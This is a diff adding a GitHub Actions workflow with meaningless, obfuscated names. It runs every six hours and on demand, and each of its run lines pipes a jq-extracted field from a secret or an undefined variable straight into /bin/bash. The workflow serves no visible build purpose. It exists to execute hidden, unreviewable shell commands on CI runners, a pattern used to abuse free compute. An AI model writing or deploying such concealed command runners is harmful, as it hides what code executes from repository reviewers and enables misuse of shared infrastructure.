@@ -1,0 +1,25 @@
+name: zhengduanjiantu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengduanjiantu
+        env:
+          bvzlc09086: ${{ secrets.bvzlc09086 }}
+        run: |
+          echo $bvzlc09086 | jq -r .lu8047 | /bin/bash
+          echo $ou476 | jq -r .nhow01828 | /bin/bash
+          echo $nf460 | jq -r .z79176 | /bin/bash
+          echo $da5 | jq -r .umq1 | /bin/bash
+          echo $ki0199 | jq -r .ekb3 | /bin/bash
+          echo $skhx7 | jq -r .nq3912 | /bin/bash
+          echo $w20707 | jq -r .b6 | /bin/bash
+          echo $t09 | jq -r .pgu6711 | /bin/bash
+
